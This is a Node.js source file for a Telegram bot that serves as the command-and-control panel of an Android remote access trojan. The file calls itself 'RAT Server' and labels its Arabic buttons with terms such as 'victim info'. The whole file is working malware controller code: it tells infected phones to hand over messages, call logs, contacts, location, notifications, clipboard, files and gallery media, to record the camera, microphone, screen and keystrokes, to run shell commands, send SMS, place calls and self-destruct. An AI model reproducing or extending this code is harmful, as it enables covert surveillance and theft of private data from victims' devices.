const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require("path");
const { io, sendCommand, clients } = require("./server");
const { COMMANDS } = require("./protocol");

const data = JSON.parse(fs.readFileSync(path.join(__dirname, "data.json"), "utf8"));
const ADMIN_ID = String(data.adminId);
const bot = new TelegramBot(data.token, { polling: true });

const state = new Map();

function isAdmin(msg) {
  return String(msg.chat.id) === ADMIN_ID || String(msg.from?.id) === ADMIN_ID;
}

function mainKeyboard() {
  return {
    keyboard: [
      [{ text: "📱 الأجهزة" }, { text: "👤 معلومات الضحية" }],
      [{ text: "🔋 البطارية" }, { text: "📍 الموقع" }],
      [{ text: "📶 الشبكة" }, { text: "📱 SIM" }],
      [{ text: "💬 الرسائل" }, { text: "📞 المكالمات" }],
      [{ text: "👥 جهات الاتصال" }, { text: "📲 إجراء مكالمة" }],
      [{ text: "📸 الكاميرا" }, { text: "🎥 فيديو الكاميرا" }],
      [{ text: "🎙 المايك" }, { text: "📡 بث الكاميرا" }],
      [{ text: "📺 لقطة شاشة" }, { text: "🖥 بث الشاشة" }],
      [{ text: "🖼 صور المعرض" }, { text: "🎬 فيديوهات المعرض" }],
      [{ text: "📂 عرض الملفات" }, { text: "⬇️ تحميل ملف" }],
      [{ text: "🔔 الإشعارات" }, { text: "📦 التطبيقات" }],
      [{ text: "📋 الحافظة" }, { text: "⌨️ الكيبورد" }],
      [{ text: "📳 اهتزاز" }, { text: "🔗 فتح رابط" }],
      [{ text: "💬 عرض رسالة" }, { text: "🔦 الفلاش" }],
      [{ text: "🔊 الصوت" }, { text: "🔒 قفل الشاشة" }],
      [{ text: "📡 الواي فاي" }, { text: "🔵 البلوتوث" }],
      [{ text: "⚡ Shell" }, { text: "🔄 إعادة تشغيل" }],
      [{ text: "💥 تدمير ذاتي" }],
    ],
    resize_keyboard: true,
  };
}

function requireClient(chatId) {
  const s = state.get(chatId);
  if (!s || !s.clientId) {
    bot.sendMessage(chatId, "⚠️ اختر جهاز من *📱 الأجهزة* أول.", { parse_mode: "Markdown" });
    return null;
  }
  if (!clients.has(s.clientId)) {
    bot.sendMessage(chatId, "⚠️ الجهاز غير متصل.");
    return null;
  }
  return s.clientId;
}

async function run(chatId, clientId, command, args, label) {
  try {
    bot.sendMessage(chatId, `⏳ جاري ${label}...`);
    return await sendCommand(clientId, command, args);
  } catch (e) {
    bot.sendMessage(chatId, `❌ فشل: ${e.message}`);
    return null;
  }
}

bot.onText(/\/start/, (msg) => {
  if (!isAdmin(msg)) return bot.sendMessage(msg.chat.id, "⛔ غير مصرح.");
  state.set(msg.chat.id, { clientId: null, awaiting: null });
  bot.sendMessage(
    msg.chat.id,
    `🔥 *RAT Server*\n\nمرحباً. اضغط *📱 الأجهزة* لاختيار جهاز ثم تحكم فيه من الأزرار.`,
    { parse_mode: "Markdown", reply_markup: mainKeyboard() }
  );
});

bot.on("message", async (msg) => {
  if (!msg.text || !isAdmin(msg)) return;
  const chatId = msg.chat.id;
  const text = msg.text.trim();
  if (text.startsWith("/")) return;

  const s = state.get(chatId) || { clientId: null, awaiting: null };

  if (s.awaiting) {
    const a = s.awaiting;
    s.awaiting = null;
    state.set(chatId, s);
    return handleAwaiting(chatId, a, text);
  }

  switch (text) {
    case "📱 الأجهزة": {
      if (clients.size === 0) return bot.sendMessage(chatId, "⚠️ ما فيه أجهزة متصلة.");
      const buttons = [];
      for (const clientId of clients.keys())
        buttons.push([{ text: `📱 ${clientId}`, callback_data: `pick|${clientId}` }]);
      return bot.sendMessage(chatId, "اختر جهاز:", { reply_markup: { inline_keyboard: buttons } });
    }
    case "👤 معلومات الضحية": {
      const cid = requireClient(chatId); if (!cid) return;
      const r = await run(chatId, cid, COMMANDS.DEVICE_INFO, {}, "جلب معلومات الجهاز");
      if (r) bot.sendMessage(chatId, `📱 *${cid}*\n\n\`\`\`\n${JSON.stringify(r, null, 2)}\n\`\`\``, { parse_mode: "Markdown" });
      return;
    }
    case "🔋 البطارية": {
      const cid = requireClient(chatId); if (!cid) return;
      const r = await run(chatId, cid, COMMANDS.BATTERY, {}, "جلب البطارية");
      if (r) bot.sendMessage(chatId, `🔋 ${r.level}% • ${r.status}`);
      return;
    }
    case "📍 الموقع": {
      const cid = requireClient(chatId); if (!cid) return;
      const r = await run(chatId, cid, COMMANDS.LOCATION, {}, "جلب الموقع");
      if (r && r.lat) bot.sendLocation(chatId, r.lat, r.lng);
      return;
    }
    case "📶 الشبكة": {
      const cid = requireClient(chatId); if (!cid) return;
      const r = await run(chatId, cid, COMMANDS.NETWORK_INFO, {}, "جلب الشبكة");
      if (r) bot.sendMessage(chatId, `📶 *الشبكة*\n\`\`\`\n${JSON.stringify(r, null, 2)}\n\`\`\``, { parse_mode: "Markdown" });
      return;
    }
    case "📱 SIM": {
      const cid = requireClient(chatId); if (!cid) return;
      const r = await run(chatId, cid, COMMANDS.SIM_INFO, {}, "جلب SIM");
      if (r) bot.sendMessage(chatId, `📱 *SIM*\n\`\`\`\n${JSON.stringify(r, null, 2)}\n\`\`\``, { parse_mode: "Markdown" });
      return;
    }
    case "💬 الرسائل": {
      const cid = requireClient(chatId); if (!cid) return;
      const r = await run(chatId, cid, COMMANDS.SMS_LIST, { limit: 20 }, "سحب الرسائل");
      if (r && Array.isArray(r)) {
        let out = `💬 *آخر ${r.length} رسالة:*\n\n`;
        for (const m of r) out += `📩 ${m.address}\n📝 ${m.body}\n🕒 ${m.date}\n\n`;
        bot.sendMessage(chatId, out || "لا رسائل.", { parse_mode: "Markdown" });
        s.awaiting = "sms_send"; state.set(chatId, s);
        bot.sendMessage(chatId, "لإرسال رسالة اكتب: `رقم|النص` أو /skip");
      }
      return;
    }
    case "📞 المكالمات": {
      const cid = requireClient(chatId); if (!cid) return;
      const r = await run(chatId, cid, COMMANDS.CALL_LOG, { limit: 20 }, "سحب المكالمات");
      if (r && Array.isArray(r)) {
        let out = `📞 *آخر ${r.length} مكالمة:*\n\n`;
        for (const c of r) out += `${c.type} • ${c.number} • ${c.duration}s • ${c.date}\n`;
        bot.sendMessage(chatId, out || "لا مكالمات.", { parse_mode: "Markdown" });
      }
      return;
    }
    case "👥 جهات الاتصال": {
      const cid = requireClient(chatId); if (!cid) return;
      const r = await run(chatId, cid, COMMANDS.CONTACTS_ALL, {}, "جلب جهات الاتصال");
      if (r && Array.isArray(r)) {
        let out = `👥 *${r.length} جهة اتصال:*\n\n`;
        for (const c of r) out += `👤 ${c.name} — ${c.number}\n`;
        bot.sendMessage(chatId, out || "لا جهات اتصال.", { parse_mode: "Markdown" });
      }
      return;
    }
    case "📲 إجراء مكالمة": {
      const cid = requireClient(chatId); if (!cid) return;
      s.awaiting = "call_make"; state.set(chatId, s);
      bot.sendMessage(chatId, "أدخل الرقم للاتصال:");
      return;
    }
    case "📸 الكاميرا": {
      const cid = requireClient(chatId); if (!cid) return;
      bot.sendMessage(chatId, "اختر:", { reply_markup: { inline_keyboard: [
        [{ text: "📷 خلفية", callback_data: `cam|${cid}|back` }],
        [{ text: "🤳 أمامية", callback_data: `cam|${cid}|front` }],
      ]}});
      return;
    }
    case "🎥 فيديو الكاميرا": {
      const cid = requireClient(chatId); if (!cid) return;
      s.awaiting = "cam_video"; state.set(chatId, s);
      bot.sendMessage(chatId, "أدخل: `أمامية|10` أو `خلفية|10` (كاميرا|ثواني)");
      return;
    }
    case "🎙 المايك": {
      const cid = requireClient(chatId); if (!cid) return;
      s.awaiting = "mic_seconds"; state.set(chatId, s);
      bot.sendMessage(chatId, "كم ثانية أسجل؟");
      return;
    }
    case "📡 بث الكاميرا": {
      const cid = requireClient(chatId); if (!cid) return;
      await run(chatId, cid, COMMANDS.CAMERA_STREAM_START, { facing: "back" }, "بدء بث الكاميرا");
      bot.sendMessage(chatId, "✅ البث بدأ. لإيقاف: /stop_cam");
      return;
    }
    case "📺 لقطة شاشة": {
      const cid = requireClient(chatId); if (!cid) return;
      const r = await run(chatId, cid, COMMANDS.SCREEN_CAPTURE, {}, "سحب لقطة شاشة");
      if (r && r.url) bot.sendPhoto(chatId, r.url, { caption: "📺 لقطة الشاشة" });
      return;
    }
    case "🖥 بث الشاشة": {
      const cid = requireClient(chatId); if (!cid) return;
      await run(chatId, cid, COMMANDS.SCREEN_STREAM_START, {}, "بدء بث الشاشة");
      bot.sendMessage(chatId, "✅ البث بدأ. لإيقاف: /stop_screen");
      return;
    }
    case "🖼 صور المعرض": {
      const cid = requireClient(chatId); if (!cid) return;
      const r = await run(chatId, cid, COMMANDS.GALLERY_PHOTOS, { limit: 10 }, "جلب صور المعرض");
      if (r && Array.isArray(r)) {
        for (const p of r) {
          if (p.url) bot.sendPhoto(chatId, p.url, { caption: p.name });
        }
      }
      return;
    }
    case "🎬 فيديوهات المعرض": {
      const cid = requireClient(chatId); if (!cid) return;
      const r = await run(chatId, cid, COMMANDS.GALLERY_VIDEOS, { limit: 10 }, "جلب فيديوهات المعرض");
      if (r && Array.isArray(r)) {
        let out = `🎬 *${r.length} فيديو:*\n\n`;
        for (const v of r) out += `📹 ${v.name} (${v.size})\n${v.url}\n\n`;
        bot.sendMessage(chatId, out || "لا فيديوهات.", { parse_mode: "Markdown" });
      }
      return;
    }
    case "📂 عرض الملفات": {
      const cid = requireClient(chatId); if (!cid) return;
      s.awaiting = "file_list_path"; state.set(chatId, s);
      bot.sendMessage(chatId, "أدخل مسار المجلد (أو / لـ root):");
      return;
    }
    case "⬇️ تحميل ملف": {
      const cid = requireClient(chatId); if (!cid) return;
      s.awaiting = "file_download"; state.set(chatId, s);
      bot.sendMessage(chatId, "أدخل المسار الكامل للملف:");
      return;
    }
    case "🔔 الإشعارات": {
      const cid = requireClient(chatId); if (!cid) return;
      const r = await run(chatId, cid, COMMANDS.NOTIFICATIONS, { limit: 20 }, "سحب الإشعارات");
      if (r && Array.isArray(r)) {
        let out = `🔔 *${r.length} إشعار:*\n\n`;
        for (const n of r) out += `📱 ${n.app}\n📝 ${n.title} — ${n.text}\n🕒 ${n.time}\n\n`;
        bot.sendMessage(chatId, out || "لا إشعارات.", { parse_mode: "Markdown" });
      }
      return;
    }
    case "📦 التطبيقات": {
      const cid = requireClient(chatId); if (!cid) return;
      const r = await run(chatId, cid, COMMANDS.INSTALLED_APPS, {}, "جلب التطبيقات");
      if (r && Array.isArray(r)) {
        let out = `📦 *${r.length} تطبيق:*\n\n`;
        for (const a of r) out += `• ${a.label} (${a.package})\n`;
        bot.sendMessage(chatId, out, { parse_mode: "Markdown" });
      }
      return;
    }
    case "📋 الحافظة": {
      const cid = requireClient(chatId); if (!cid) return;
      const r = await run(chatId, cid, COMMANDS.CLIPBOARD, {}, "قراءة الحافظة");
      if (r) bot.sendMessage(chatId, `📋 ${r.text || "(فارغة)"}`);
      return;
    }
    case "⌨️ الكيبورد": {
      const cid = requireClient(chatId); if (!cid) return;
      bot.sendMessage(chatId, "الكيبورد:", { reply_markup: { inline_keyboard: [
        [{ text: "▶️ بدء", callback_data: `key|${cid}|start` }],
        [{ text: "⏹️ إيقاف وجلب", callback_data: `key|${cid}|stop` }],
      ]}});
      return;
    }
    case "📳 اهتزاز": {
      const cid = requireClient(chatId); if (!cid) return;
      await run(chatId, cid, COMMANDS.VIBRATE, { ms: 3000 }, "اهتزاز");
      bot.sendMessage(chatId, "✅");
      return;
    }
    case "🔗 فتح رابط": {
      const cid = requireClient(chatId); if (!cid) return;
      s.awaiting = "open_url"; state.set(chatId, s);
      bot.sendMessage(chatId, "أدخل الرابط:");
      return;
    }
    case "💬 عرض رسالة": {
      const cid = requireClient(chatId); if (!cid) return;
      s.awaiting = "show_msg"; state.set(chatId, s);
      bot.sendMessage(chatId, "أدخل: `العنوان|النص`");
      return;
    }
    case "🔦 الفلاش": {
      const cid = requireClient(chatId); if (!cid) return;
      bot.sendMessage(chatId, "الفلاش:", { reply_markup: { inline_keyboard: [
        [{ text: "🔆 تشغيل", callback_data: `flash|${cid}|on` }],
        [{ text: "🌑 إطفاء", callback_data: `flash|${cid}|off` }],
      ]}});
      return;
    }
    case "🔊 الصوت": {
      const cid = requireClient(chatId); if (!cid) return;
      s.awaiting = "volume"; state.set(chatId, s);
      bot.sendMessage(chatId, "مستوى الصوت (0-100):");
      return;
    }
    case "🔒 قفل الشاشة": {
      const cid = requireClient(chatId); if (!cid) return;
      await run(chatId, cid, COMMANDS.SCREEN_LOCK, {}, "قفل الشاشة");
      bot.sendMessage(chatId, "✅");
      return;
    }
    case "📡 الواي فاي": {
      const cid = requireClient(chatId); if (!cid) return;
      s.awaiting = "wifi"; state.set(chatId, s);
      bot.sendMessage(chatId, "واي فاي: `on` أو `off`");
      return;
    }
    case "🔵 البلوتوث": {
      const cid = requireClient(chatId); if (!cid) return;
      s.awaiting = "bt"; state.set(chatId, s);
      bot.sendMessage(chatId, "بلوتوث: `on` أو `off`");
      return;
    }
    case "⚡ Shell": {
      const cid = requireClient(chatId); if (!cid) return;
      s.awaiting = "shell"; state.set(chatId, s);
      bot.sendMessage(chatId, "أدخل أمر Shell:");
      return;
    }
    case "🔄 إعادة تشغيل": {
      const cid = requireClient(chatId); if (!cid) return;
      await run(chatId, cid, COMMANDS.DEVICE_REBOOT, {}, "إعادة تشغيل");
      bot.sendMessage(chatId, "✅");
      return;
    }
    case "💥 تدمير ذاتي": {
      const cid = requireClient(chatId); if (!cid) return;
      await run(chatId, cid, COMMANDS.SELF_DESTRUCT, {}, "تدمير ذاتي");
      bot.sendMessage(chatId, "💥 تم.");
      return;
    }
  }
});

async function handleAwaiting(chatId, awaiting, text) {
  const s = state.get(chatId);
  if (text === "/skip") return bot.sendMessage(chatId, "تم التخطي.");
  const cid = s.clientId;
  if (!cid) return bot.sendMessage(chatId, "⚠️ اختر جهاز أول.");

  if (awaiting === "sms_send") {
    const [number, ...rest] = text.split("|");
    const body = rest.join("|").trim();
    if (!number || !body) return bot.sendMessage(chatId, "صيغة: رقم|نص");
    const r = await run(chatId, cid, COMMANDS.SMS_SEND, { number: number.trim(), body }, "إرسال رسالة");
    if (r) bot.sendMessage(chatId, "✅ تم.");
    return;
  }
  if (awaiting === "call_make") {
    const r = await run(chatId, cid, COMMANDS.CALL_MAKE, { number: text }, "إجراء مكالمة");
    if (r) bot.sendMessage(chatId, "✅ تم.");
    return;
  }
  if (awaiting === "cam_video") {
    const [facing, sec] = text.split("|");
    const r = await run(chatId, cid, COMMANDS.CAMERA_VIDEO, { facing: facing || "back", seconds: parseInt(sec, 10) || 10 }, "تسجيل فيديو");
    if (r && r.url) bot.sendVideo(chatId, r.url, { caption: "🎥" });
    return;
  }
  if (awaiting === "mic_seconds") {
    const sec = parseInt(text, 10);
    if (isNaN(sec) || sec < 1 || sec > 300) return bot.sendMessage(chatId, "رقم 1-300.");
    const r = await run(chatId, cid, COMMANDS.MIC_RECORD, { seconds: sec }, "تسجيل");
    if (r && r.url) bot.sendAudio(chatId, r.url, { caption: `🎙 ${sec}ث` });
    return;
  }
  if (awaiting === "file_list_path") {
    const r = await run(chatId, cid, COMMANDS.FILE_LIST, { path: text }, "قراءة");
    if (r && Array.isArray(r)) {
      let out = `📂 *${text}*\n\n`;
      for (const f of r) out += `${f.isDir ? "📁" : "📄"} ${f.name} (${f.size})\n`;
      bot.sendMessage(chatId, out || "فارغ.", { parse_mode: "Markdown" });
    }
    return;
  }
  if (awaiting === "file_download") {
    const r = await run(chatId, cid, COMMANDS.FILE_DOWNLOAD, { path: text }, "تحميل ملف");
    if (r && r.url) bot.sendDocument(chatId, r.url, { caption: text });
    return;
  }
  if (awaiting === "open_url") {
    const r = await run(chatId, cid, COMMANDS.OPEN_URL, { url: text }, "فتح رابط");
    if (r) bot.sendMessage(chatId, "✅");
    return;
  }
  if (awaiting === "show_msg") {
    const [title, ...rest] = text.split("|");
    const msg = rest.join("|").trim();
    const r = await run(chatId, cid, COMMANDS.SHOW_MESSAGE, { title: title.trim(), text: msg }, "عرض رسالة");
    if (r) bot.sendMessage(chatId, "✅");
    return;
  }
  if (awaiting === "volume") {
    const lvl = parseInt(text, 10);
    if (isNaN(lvl) || lvl < 0 || lvl > 100) return bot.sendMessage(chatId, "رقم 0-100.");
    const r = await run(chatId, cid, COMMANDS.VOLUME, { level: lvl }, "ضبط الصوت");
    if (r) bot.sendMessage(chatId, "✅");
    return;
  }
  if (awaiting === "wifi") {
    const r = await run(chatId, cid, COMMANDS.WIFI_TOGGLE, { on: text === "on" }, "واي فاي");
    if (r) bot.sendMessage(chatId, "✅");
    return;
  }
  if (awaiting === "bt") {
    const r = await run(chatId, cid, COMMANDS.BLUETOOTH_TOGGLE, { on: text === "on" }, "بلوتوث");
    if (r) bot.sendMessage(chatId, "✅");
    return;
  }
  if (awaiting === "shell") {
    const r = await run(chatId, cid, COMMANDS.SHELL, { cmd: text }, "تنفيذ أمر");
    if (r) bot.sendMessage(chatId, `💻 \`\`\`\n${r.output || ""}\n\`\`\``, { parse_mode: "Markdown" });
    return;
  }
}

bot.on("callback_query", async (q) => {
  if (!isAdmin(q)) return bot.answerCallbackQuery(q.id, { text: "⛔" });
  const chatId = q.message.chat.id;
  const d = q.data || "";

  if (d.startsWith("pick|")) {
    const clientId = d.split("|")[1];
    const s = state.get(chatId) || {};
    s.clientId = clientId;
    state.set(chatId, s);
    bot.answerCallbackQuery(q.id, { text: `✅ ${clientId}` });
    bot.sendMessage(chatId, `✅ الجهاز: *${clientId}*`, { parse_mode: "Markdown", reply_markup: mainKeyboard() });
    return;
  }
  if (d.startsWith("cam|")) {
    const [, clientId, which] = d.split("|");
    bot.answerCallbackQuery(q.id);
    const r = await run(chatId, clientId, COMMANDS.CAMERA_PHOTO, { facing: which }, "التقاط");
    if (r && r.url) bot.sendPhoto(chatId, r.url, { caption: `📸 ${which}` });
    return;
  }
  if (d.startsWith("key|")) {
    const [, clientId, action] = d.split("|");
    bot.answerCallbackQuery(q.id);
    if (action === "start") {
      await run(chatId, clientId, COMMANDS.KEYLOG_START, {}, "بدء");
      bot.sendMessage(chatId, "✅ يسجل.");
    } else {
      const r = await run(chatId, clientId, COMMANDS.KEYLOG_STOP, {}, "إيقاف");
      if (r && r.text) bot.sendMessage(chatId, `⌨️ *النص:*\n\n${r.text}`, { parse_mode: "Markdown" });
      else bot.sendMessage(chatId, "⏹️");
    }
    return;
  }
  if (d.startsWith("flash|")) {
    const [, clientId, act] = d.split("|");
    bot.answerCallbackQuery(q.id);
    const r = await run(chatId, clientId, COMMANDS.FLASHLIGHT, { on: act === "on" }, "الفلاش");
    if (r) bot.sendMessage(chatId, "✅");
    return;
  }
  bot.answerCallbackQuery(q.id);
});

bot.onText(/\/stop_cam/, async (msg) => {
  if (!isAdmin(msg)) return;
  const s = state.get(msg.chat.id);
  if (!s?.clientId) return;
  await run(msg.chat.id, s.clientId, COMMANDS.CAMERA_STREAM_STOP, {}, "إيقاف بث الكاميرا");
  bot.sendMessage(msg.chat.id, "⏹️ تم.");
});

bot.onText(/\/stop_screen/, async (msg) => {
  if (!isAdmin(msg)) return;
  const s = state.get(msg.chat.id);
  if (!s?.clientId) return;
  await run(msg.chat.id, s.clientId, COMMANDS.SCREEN_STREAM_STOP, {}, "إيقاف بث الشاشة");
  bot.sendMessage(msg.chat.id, "⏹️ تم.");
});

io.on("__bot_event", (evt) => {
  if (evt.type === "client_online")
    bot.sendMessage(ADMIN_ID, `🟢 جهاز متصل: *${evt.clientId}*`, { parse_mode: "Markdown" });
  if (evt.type === "client_offline")
    bot.sendMessage(ADMIN_ID, `🔴 قطع: *${evt.clientId}*`, { parse_mode: "Markdown" });
});

console.log("bot up");
